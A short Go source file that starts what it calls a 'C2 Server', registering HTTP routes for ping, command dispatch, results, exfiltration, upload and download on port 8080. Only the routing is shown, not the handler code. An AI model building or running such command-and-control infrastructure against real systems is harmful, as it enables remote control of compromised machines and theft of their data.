package main

import (
	"log"
	"net/http"

	"taburtuai/server/handlers"
)

func main() {
	http.HandleFunc("/ping", handlers.PingHandler)
	http.HandleFunc("/result", handlers.ResultHandler)
	http.HandleFunc("/command", handlers.CommandHandler)
	http.HandleFunc("/exfil", handlers.ExfilHandler)

	// Tambahkan route Upload & Download
	http.HandleFunc("/upload", handlers.UploadHandler)
	http.HandleFunc("/download", handlers.DownloadHandler)

	log.Println("[+] C2 Server running on :8080")
	http.ListenAndServe(":8080", nil)
}
